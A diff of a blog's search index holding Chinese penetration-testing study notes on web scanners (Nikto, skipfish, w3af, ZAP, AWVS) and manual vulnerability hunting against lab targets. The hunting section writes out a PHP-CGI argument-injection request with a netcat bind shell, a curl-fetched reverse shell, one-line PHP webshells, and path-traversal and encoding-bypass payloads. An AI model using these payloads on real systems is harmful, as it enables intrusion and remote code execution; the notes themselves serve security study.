class="line">mangle#基于正则替换特征字符串,用于注入</span><br><span class="line">auth#身份认证</span><br><span class="line">bruteforce#暴力破解</span><br><span class="line">output#扫描结果output输出,提供调用</span><br><span class="line">crawl#爬虫</span><br><span class="line">attack#exploit攻击利用模块</span><br></pre></td></tr></table></figure><ul><li><p>安装(kali自带版本执行扫描时挂死)    ps aux | grep w3af | kill pid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y python-pip w3af</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;andresriancho&#x2F;w3af.git</span><br><span class="line">cd w3af</span><br><span class="line">.&#x2F;w3af_console (.&#x2F;w3af_gui)</span><br><span class="line">apt-get build-dep python-lxml</span><br><span class="line">.&#x2F;tmp&#x2F;w3af_dependency_install.sh</span><br></pre></td></tr></table></figure><p>  <strong>升级</strong></p><pre><code>git pull</code></pre><p>  <strong>创建快捷方式</strong></p><pre><code>/usr/share/appllcations/w3af.desktop</code></pre><p>  <strong>用户接口</strong></p><pre><code>ConsoleGuiAPI</code></pre><p>  <strong>w3af_console</strong></p><pre><code>help            #显示可用指令plugin            #进入plugin子命令    Help        #显示可用指令    list audit    #列出audit类所有插件    audit sqli xss    #选择使用的audit插件http-settings / misc-settings    #全局配置    help    view        #查看可配置的参数    set            #设置参数    back        #回到上一级命令Profiles    save as self-contained    save as test self-containedTarget    set target http://1.1.1.1/StartScript    script/*.w3af</code></pre></li></ul><p><strong>w3af–身份认证</strong></p><pre><code>HTTP Basic        #基于base64编码的明文密码传输,win03NTLM            #windows独有的身份认证FormCookie            #双因素身份认证 / anti-CSRF tokens</code></pre><p><strong>w3af–截断代理</strong></p><pre><code>截断代理HTTP header file (另类的身份认证方法)W3af不支持客户端技术(Javascript,Flash,Java applet等)截断代理手动爬网    spider_men    ouptut.export_requests    http://127.7.7.7/spider_man$terminate         #终止spider_mancrawl.import_results    base64</code></pre><p><strong>w3af–其它特性</strong></p><pre><code>exploitFuzzy Requests    Numbers from 0 to 4:$range(5)$    First ten letters:$string.lowercase[:10]$    The words spam and eggs:$[&apos;spam&apos;,&apos;eggs&apos;]$    The content of a file:$[l.strip() for l in file (&apos;input.txt&apos;)]$Cluster responses</code></pre><blockquote><h4 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a><strong>Arachni</strong></h4></blockquote><pre><code>Kali自带了旧的arachni阉割版安装    http://www.arachni-scanner.com/download/#Linux    tar xvf arachni.tar.gz    cd arachni    cd bin      ./arachni_web    http://localhost:9292/        admin@admin.admin    / administratorProfile    Import    Export    NewDispatcher    #分布式扫描部署    ./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1        #创建实例Grid    ./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111Scan</code></pre><blockquote><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a><strong>OWASP_ZAP</strong></h4><p>Zed attack proxy<br>WEB Application集成渗透测试和漏洞挖掘工具<br>开源免费跨平台简单易用</p></blockquote><pre><code>截断代理主动,被动扫描Fuzzy,暴力破解API    http://zap/Persist SessionMode--Safe,Protected,Standard,ATTACK升级add-onsScan policyAnti CSRF Tokenshttps--CAScope / Contexts / filterHttp Sessions--defauit session tokens &amp; site session tokensNote / tagPassive scan标准扫描工作流程    设置代理    手动爬网    自动爬网    主动扫描</code></pre><blockquote><h4 id="AWVS-Acunetix-Web-Vulnerability-Scanner"><a href="#AWVS-Acunetix-Web-Vulnerability-Scanner" class="headerlink" title="AWVS (Acunetix Web Vulnerability Scanner)"></a><strong>AWVS</strong> (Acunetix Web Vulnerability Scanner)</h4></blockquote><p>自动手动爬网,支持AJAX,JavaScript<br>AcuSensor灰盒测试<br>    发现爬网无法发现文件<br>    额外的漏洞扫描<br>    可发现存在漏洞的源码行号<br>    支持PHP,.NET(不获取源码的情况下注入已编译.NET)<br>生成PCI,27001标准和规报告<br>网络扫描<br>    FTP,DNS,SMTP,IMAP,POP3,SSH,SNMP,Telnet<br>    集成openvas扫描漏洞</p><p>爬站<br>子域扫描器<br>发现扫描器<br>SQL注入验证<br>Http editor<br>Http sniffer<br>Http Fuzzer<br>身份认证测试<br>结果比较</p><p>AcuSensor安装<br>    生成agent文件 acu_phpaspect.php(PHP5.0以上)<br>    将文件拷贝到目标服务器,web程序可以访问到目录<br>    修改.htaccess或php.ini<br>        <code>php_value auto_prepend_file &#39;[path to acu_phpaspect.php file]&#39;</code></p><blockquote><h4 id="APPSCAN"><a href="#APPSCAN" class="headerlink" title="APPSCAN"></a><strong>APPSCAN</strong></h4></blockquote><p>Watchfire APPScan,2007年被IBM收购,成为IBM APPScan<br>扫描过程<br>    探索阶段<br>    测试阶段<br>第一个过程发现新的URL地址,下一个扫描过程自动开始<br>向导方式<br>完全配置</p><p>Glass box<br>    相当于Acusensor<br>    Agent收集服务器端源代码信息和其他数据<br>    主持JAVA,.NET两种平台</p>]]></content>
+        <content type="html"><![CDATA[<p><strong>环境准备</strong></p><ul><li>Metasploitable2</li><li>DVWA</li></ul><p><strong>侦察</strong><br>    <code>Httrack</code>        #镜像目标网站到本地<br>        减少与目标系统交互</p><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a><strong>扫描工具</strong></h3><ul><li>Nikto</li><li>Vega</li><li>Skipfish</li><li>W3af</li><li>Arachni</li><li>Owasp-zap</li><li>AWVS</li><li>APPSCAN</li></ul><p><del>Web Penetration Testing with Kali Linux        #Read Book,有点过时</del></p><blockquote><h4 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a><strong>Nikto</strong></h4></blockquote><p>Perl语言开发的开源web安全扫描器<br>软件版本<br>搜索存在安全隐患的文件<br>服务器配置漏洞<br>Web Application层面的安全隐患</p><pre><code>避免404误判    很多服务器不遵守RFC标准,对不存在的对象返回200响应码    依据响应文件内容判断,不同扩展名的文件404响应内容不同    去除时间信息后的内容取MD5值    -no404nikto -list-plugins        #插件nikto -update    cirt.net    http://cirt.net/nikto/UPDATES/nikto -host http://1.1.1.1nikto -host 192.168.1.1 -ssl -port 443,8443,995nikto -host host.txt                    #扫描多个目标,目标地址存放到文件nmap -p80 192.168.254.0/24 -oG - | nikto -host -    #结合nmap扫描nikto -host 192.168.254.115 -useproxy http://localhost:8087-vhost</code></pre><p><strong>Nikto-interactive</strong></p><pre><code>Space - report current scan status    #查看扫描状态v - verbose mode on/off     #查看正在扫描的信息d - debug mode on/off        #查看更详细的信息e - error reporting on/off    p - progress reporting on/off    #查看并计算扫描总体进度r - redirect display on/off        #只看状态码为重定向的扫描c - cookie display on/off        a - auth display on/offq - quitN - next hostP - Pause        #暂停扫描</code></pre><p><strong>nikto配置文件</strong></p><pre><code>/etc/nikto.confSTATIC-COOKIE=&quot;cookie1&quot;=&quot;cookie value&quot;,&quot;cookie2&quot;=&quot;cookie value&quot;-evasion:使用LibWhisker中对IDS的躲避技术,可使用以下几种类型    1.随机URL编码(非UTF-8方式)    2.自选择路径(/./)    3.过早结束的URL    4.优先考虑长随机字符串    5.参数欺骗    6.使用TAB作为命令的分隔符    7.使用变化的URL    8.使用Windows路径分隔符&quot;\&quot;nikto -host 192.168.254.115 -evasion 1678        #躲避类型可多选</code></pre><blockquote><h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a><strong>vega</strong></h4></blockquote><p>GUI<br>JAVA编写的开源Web扫描器<br>扫描模式<br>代理模式<br>爬站,处理表单,注入测试<br>支持SSL: <code>http://vega/ca.crt</code></p><blockquote><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a><strong>skipfish</strong></h4></blockquote><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快<br>  多路单线程,全异步网络I/O,消除内存管理和调度开销<br>  启发式自动内容识别</li><li>误报较低<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">skipfish -o test http:&#x2F;&#x2F;1.1.1.1</span><br><span class="line">skipfish -o test @url.txt</span><br><span class="line">skipfish -o test -S complet.wl -W a.wl http:&#x2F;&#x2F;1.1.1.1#使用字典扫描</span><br><span class="line">dpkg -L skipfish | grep wl#查询字典路径</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl#字典路径</span><br><span class="line">-I :只检查包含&#39;string&#39;的URL</span><br><span class="line">-X :不检查包含&#39;string&#39;的URL#logout</span><br><span class="line">-K :不对指定参数进行Fuzz测试</span><br><span class="line">-D :跨站点爬另外一个域</span><br><span class="line">-l :每秒最大请求数</span><br><span class="line">-m :每IP最大并发连接数</span><br><span class="line">skipfish -o skipfishtest -l 10 -m 10 -I &#x2F;dvwa&#x2F; -S &#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl http:&#x2F;&#x2F;192.168.254.115</span><br><span class="line">--config :指定配置文件</span><br><span class="line"></span><br><span class="line">身份认证</span><br><span class="line">skipfish -A user:pass -o test http:&#x2F;&#x2F;1.1.1.1</span><br><span class="line">skipfish -C &quot;name&#x3D;val&quot; -o test http:&#x2F;&#x2F;1.1.1.1#cookie登录</span><br><span class="line">表单登录</span><br><span class="line">skipfish -o a --auth-form http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;login.php --auth-form-target http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;index.php -I dvwa http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;</span><br><span class="line"></span><br><span class="line">扫描结束太快</span><br><span class="line">有可能触发了目标站点的连接数限制,降低 -m -l 数值</span><br></pre></td></tr></table></figure></li></ul><blockquote><h4 id="w3af-Web-Application-Attack-and-Audit-Framework"><a href="#w3af-Web-Application-Attack-and-Audit-Framework" class="headerlink" title="w3af(Web Application Attack and Audit Framework)"></a><strong>w3af</strong>(Web Application Attack and Audit Framework)</h4></blockquote><p>基于python语言开发<br>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">10大类近150个plugin</span><br><span class="line">audit#审计</span><br><span class="line">infrastructure#基础架构</span><br><span class="line">grep#被动扫描</span><br><span class="line">evasion#逃避目标的waf,ids检测</span><br><span class="line">mangle#基于正则替换特征字符串,用于注入</span><br><span class="line">auth#身份认证</span><br><span class="line">bruteforce#暴力破解</span><br><span class="line">output#扫描结果output输出,提供调用</span><br><span class="line">crawl#爬虫</span><br><span class="line">attack#exploit攻击利用模块</span><br></pre></td></tr></table></figure><ul><li><p>安装(kali自带版本执行扫描时挂死)    ps aux | grep w3af | kill pid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y python-pip w3af</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;andresriancho&#x2F;w3af.git</span><br><span class="line">cd w3af</span><br><span class="line">.&#x2F;w3af_console (.&#x2F;w3af_gui)</span><br><span class="line">apt-get build-dep python-lxml</span><br><span class="line">.&#x2F;tmp&#x2F;w3af_dependency_install.sh</span><br></pre></td></tr></table></figure><p>  <strong>升级</strong></p><pre><code>git pull</code></pre><p>  <strong>创建快捷方式</strong></p><pre><code>/usr/share/appllcations/w3af.desktop</code></pre><p>  <strong>用户接口</strong></p><pre><code>ConsoleGuiAPI</code></pre><p>  <strong>w3af_console</strong></p><pre><code>help            #显示可用指令plugin            #进入plugin子命令    Help        #显示可用指令    list audit    #列出audit类所有插件    audit sqli xss    #选择使用的audit插件http-settings / misc-settings    #全局配置    help    view        #查看可配置的参数    set            #设置参数    back        #回到上一级命令Profiles    save as self-contained    save as test self-containedTarget    set target http://1.1.1.1/StartScript    script/*.w3af</code></pre></li></ul><p><strong>w3af–身份认证</strong></p><pre><code>HTTP Basic        #基于base64编码的明文密码传输,win03NTLM            #windows独有的身份认证FormCookie            #双因素身份认证 / anti-CSRF tokens</code></pre><p><strong>w3af–截断代理</strong></p><pre><code>截断代理HTTP header file (另类的身份认证方法)W3af不支持客户端技术(Javascript,Flash,Java applet等)截断代理手动爬网    spider_men    ouptut.export_requests    http://127.7.7.7/spider_man$terminate         #终止spider_mancrawl.import_results    base64</code></pre><p><strong>w3af–其它特性</strong></p><pre><code>exploitFuzzy Requests    Numbers from 0 to 4:$range(5)$    First ten letters:$string.lowercase[:10]$    The words spam and eggs:$[&apos;spam&apos;,&apos;eggs&apos;]$    The content of a file:$[l.strip() for l in file (&apos;input.txt&apos;)]$Cluster responses</code></pre><blockquote><h4 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a><strong>Arachni</strong></h4></blockquote><pre><code>Kali自带了旧的arachni阉割版安装    http://www.arachni-scanner.com/download/#Linux    tar xvf arachni.tar.gz    cd arachni    cd bin      ./arachni_web    http://localhost:9292/        admin@admin.admin    / administratorProfile    Import    Export    NewDispatcher    #分布式扫描部署    ./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1        #创建实例Grid    ./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111Scan</code></pre><blockquote><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a><strong>OWASP_ZAP</strong></h4><p>Zed attack proxy<br>WEB Application集成渗透测试和漏洞挖掘工具<br>开源免费跨平台简单易用</p></blockquote><pre><code>截断代理主动,被动扫描Fuzzy,暴力破解API    http://zap/Persist SessionMode--Safe,Protected,Standard,ATTACK升级add-onsScan policyAnti CSRF Tokenshttps--CAScope / Contexts / filterHttp Sessions--defauit session tokens &amp; site session tokensNote / tagPassive scan标准扫描工作流程    设置代理    手动爬网    自动爬网    主动扫描</code></pre><blockquote><h4 id="AWVS-Acunetix-Web-Vulnerability-Scanner"><a href="#AWVS-Acunetix-Web-Vulnerability-Scanner" class="headerlink" title="AWVS (Acunetix Web Vulnerability Scanner)"></a><strong>AWVS</strong> (Acunetix Web Vulnerability Scanner)</h4></blockquote><p>自动手动爬网,支持AJAX,JavaScript<br>AcuSensor灰盒测试<br>    发现爬网无法发现文件<br>    额外的漏洞扫描<br>    可发现存在漏洞的源码行号<br>    支持PHP,.NET(不获取源码的情况下注入已编译.NET)<br>生成PCI,27001标准和规报告<br>网络扫描<br>    FTP,DNS,SMTP,IMAP,POP3,SSH,SNMP,Telnet<br>    集成openvas扫描漏洞</p><p>爬站<br>子域扫描器<br>发现扫描器<br>SQL注入验证<br>Http editor<br>Http sniffer<br>Http Fuzzer<br>身份认证测试<br>结果比较</p><p>AcuSensor安装<br>    生成agent文件 acu_phpaspect.php(PHP5.0以上)<br>    将文件拷贝到目标服务器,web程序可以访问到目录<br>    修改.htaccess或php.ini<br>        <code>php_value auto_prepend_file &#39;[path to acu_phpaspect.php file]&#39;</code></p><blockquote><h4 id="APPSCAN"><a href="#APPSCAN" class="headerlink" title="APPSCAN"></a><strong>APPSCAN</strong></h4></blockquote><ul><li><p>Watchfire APPScan,2007年被IBM收购,成为IBM APPScan</p></li><li><p>扫描过程</p><ul><li>探索阶段</li><li>测试阶段</li></ul></li><li><p>第一个过程发现新的URL地址,下一个扫描过程自动开始</p></li><li><p>向导方式</p></li><li><p>完全配置</p></li><li><p>Glass box</p><ul><li>相当于Acusensor</li><li>Agent收集服务器端源代码信息和其他数据</li><li>主持JAVA,.NET两种平台</li></ul></li></ul>]]></content>
       
       
       <categories>
@@ -1916,6 +2342,72 @@
             <tag> AWVS </tag>
             
             <tag> APPSCAN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>手动挖掘Web漏洞</title>
+      <link href="/2014/03/11/Web_Attacks/%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98Web%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2014/03/11/Web_Attacks/%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98Web%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h4 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a><strong>手动漏洞挖掘</strong></h4><ul><li><p>默认安装</p><ul><li>Windows默认安装漏洞</li><li>phpMyAdmin/setup</li><li>Ubuntu/Debian 默认安装PHP5-cgi</li><li>可直接访问 /cgi-bin/php5 和 /cgi-bin/php(爬不出来的目录)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;php?-d allow_url_include&#x3D;on -d safe_mode&#x3D;off -d suhosin.simutation&#x3D;on -d disable_functions&#x3D;&quot;&quot; -d open_basedir&#x3D;onne -d auto_prepend_file&#x3D;php:&#x2F;&#x2F;input -d cgi.force_redirect&#x3D;0 -d cgi.redirect_status_env&#x3D;0 -n HTTP&#x2F;1.1</span><br><span class="line">Host:123</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo system(&#39;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe | nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe&#39;);#PHP正向shell</span><br><span class="line">?&gt;#POST部分进行URL编码后再请求</span><br><span class="line"></span><br><span class="line">nc 192.168.254.115 4444</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST http:&#x2F;&#x2F;192.168.20.10&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1</span><br><span class="line">Host:192.168.20.10</span><br><span class="line">&lt;?php</span><br><span class="line">passthru(&#39;id&#39;);</span><br><span class="line">die();</span><br><span class="line">?&gt;</span><br><span class="line">#使用Burp Repeater重放POST请求</span><br><span class="line"></span><br><span class="line">#PHP反弹shell</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php</span><br><span class="line">nc -nvvlp 1234</span><br><span class="line">File</span><br><span class="line">Whereis</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">写入webshell</span><br><span class="line">echo &quot;&lt;?php \$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; &#x2F;var&#x2F;www&#x2F;3.php</span><br></pre></td></tr></table></figure></li></ul></li><li><p>身份认证</p><ul><li><p>常用弱口令/基于字典的密码爆破</p></li><li><p>锁定账号</p></li><li><p>信息收集</p><ul><li>手机号</li><li>密码错误提示信息</li></ul></li><li><p>密码嗅探</p></li><li><p>会话sessionID</p><ul><li>XSS/cookie importer</li><li>SessionID in URL</li><li>嗅探</li><li>SessionID 长期不变/永久不变</li><li>SessionID 生成算法<ul><li>Sequencer</li><li>私有算法</li><li>预判下一次登录时生成的SessionID</li><li>登出后返回测试</li></ul></li><li>密码找回</li></ul></li></ul></li><li><p><strong>漏洞挖掘原则</strong></p><ul><li>所有变量</li><li>所有头<ul><li>Cookie中的变量</li></ul></li><li>逐个变量删除</li></ul></li><li><p><strong>漏洞的本质</strong></p><ul><li>数据与指令的混淆</li><li>对用户输入信息过滤不严判断失误,误将指令当数据</li></ul></li></ul><p><strong>命令执行漏洞</strong></p><ul><li><p>应用程序开发者直接调用操作系统功能</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">;#同时执行其它命令</span><br><span class="line">&amp;&amp;#执行成功后才执行其它命令</span><br><span class="line">&amp;#同时执行其它命令</span><br><span class="line">|#管道符</span><br><span class="line">|| #当前一个命令执行失败,则执行管道符后的命令</span><br><span class="line">查看源码,过滤用户输入</span><br><span class="line">;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe | nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe#正向shell</span><br><span class="line">;curl http:&#x2F;&#x2F;1.1.1.1&#x2F;php-revers-shell.php#反向shell</span><br><span class="line">nc nvvlp 1234</span><br></pre></td></tr></table></figure></li><li><p>Directory traversal(目录遍历漏洞) / File include (有区别/没区别)</p><ul><li>目录权限限制不严/文件包含<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</span><br><span class="line">allow_url_include&#x3D;on#远程文件包含</span><br></pre></td></tr></table></figure></li></ul></li><li><p>应用程序功能操作文件,限制不严时导致访问WEB目录以外的文件</p><ul><li>读,写文件,远程执行代码</li></ul></li><li><p>特征但不绝对</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;a.php</span><br><span class="line">?home&#x3D;b.html</span><br><span class="line">?file&#x3D;content</span><br></pre></td></tr></table></figure></li><li><p>经典测试方法</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">?home&#x3D;main.cgi</span><br><span class="line">?page&#x3D;http:&#x2F;&#x2F;www.a.com&#x2F;1.php</span><br><span class="line">http:&#x2F;&#x2F;1.1.1.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;dir&#x2F;file.txt</span><br></pre></td></tr></table></figure></li><li><p>编码绕过字符过滤</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;.&quot;&quot;%00&quot;#绕过文件扩展名过滤</span><br><span class="line">?file&#x3D;a.doc%00.php</span><br></pre></td></tr></table></figure><ul><li>使用多种编码尝试</li></ul></li><li><p>不同操作系统的路径特征字符</p><ul><li><p>类unix系统</p><ul><li>根目录:/</li><li>目录层级分隔符:/</li></ul></li><li><p>Windows系统</p><ul><li>C:\</li><li>\或/</li></ul></li><li><p>编码</p><ul><li>url编码,双层url编码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%2e%2e%2f解码: ..&#x2F;</span><br><span class="line">%2e%2e%5c解码: ..\</span><br><span class="line">%252e%252e%255c2次解码: ..\</span><br><span class="line">Unicode&#x2F;UTF-8编码</span><br><span class="line">..%c0%af解码: ..&#x2F;</span><br><span class="line">..%u2216</span><br><span class="line">..%c1%9c解码 ..\</span><br></pre></td></tr></table></figure></li></ul></li><li><p>其它系统路径可能使用到的字符</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file.txt...</span><br><span class="line">file.txt&lt;spaces&gt;</span><br><span class="line">file.txt&quot;&quot;&quot;&quot;</span><br><span class="line">file.txt&lt;&lt;&lt;&gt;&gt;&gt;&lt;</span><br><span class="line">.&#x2F;.&#x2F;.&#x2F;file.txt</span><br><span class="line">nonexistant&#x2F;..&#x2F;file.txt</span><br><span class="line">UNC路径</span><br><span class="line">\\1.1.1.1\path\to\file.txt#windows文件共享</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>本地文件包含漏洞</strong>(LFI)</p><ul><li>查看文件</li><li>代码执行  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</span><br><span class="line">Apache access.log</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>远程文件包含漏洞</strong>(RFI)</p><ul><li><p>出现概率少于lfi,但更容易被利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;vulns#kali字典文件包含漏洞攻击向量</span><br></pre></td></tr></table></figure></li><li><p>文件上传漏洞</p><ul><li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li></ul></li><li><p>直接上传webshell</p></li><li><p>修改文件类型上传webshell</p><ul><li>Mimetype–文件头,扩展名</li></ul></li><li><p>修改扩展名上传webshell</p><ul><li>静态解析文件扩展名时可能无法执行</li></ul></li><li><p>文件头绕过过滤上传webshell</p></li><li><p>上传目录权限</p></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> Web渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞挖掘 </tag>
+            
+            <tag> 文件包含漏洞 </tag>
+            
+            <tag> 编码绕过 </tag>
+            
+            <tag> 目录遍历漏洞 </tag>
+            
+            <tag> 命令执行漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>漏洞的基本概念及漏洞发现管理</title>
+      <link href="/2014/02/17/Information_Gethering/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/"/>
+      <url>/2014/02/17/Information_Gethering/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4></blockquote><p>基于端口服务扫描结果版本信息(速度慢)<br>搜索已公开的漏洞数据库(数量大)<br>使用弱点扫描器实现漏洞管理</p><blockquote><h4 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h4></blockquote><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>    #kali官方漏洞库<br><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><code>sandi漏洞库</code> #程序停更<br>    <code>searchsploit tomcat</code><br>    <code>cd /usr/share/exploitdb/exploits/</code></p><blockquote><h4 id="从信息的纬度定义漏洞管理"><a href="#从信息的纬度定义漏洞管理" class="headerlink" title="从信息的纬度定义漏洞管理"></a>从信息的纬度定义漏洞管理</h4></blockquote><p>信息收集:<br>    扫描发现网络IP,OS,服务,配置,漏洞<br>    能力需求:定义扫描方式内容和目标<br>信息管理:<br>    格式化信息,并进行筛选,分组,定义优先级<br>    能力需求:资产分组,指定所有者,向所有者报告漏洞<br>信息输出:<br>    向不同层级的人群展示足够的信息量<br>    能力需求:生成报告,导出数据,与SIEM集成</p><blockquote><h5 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" 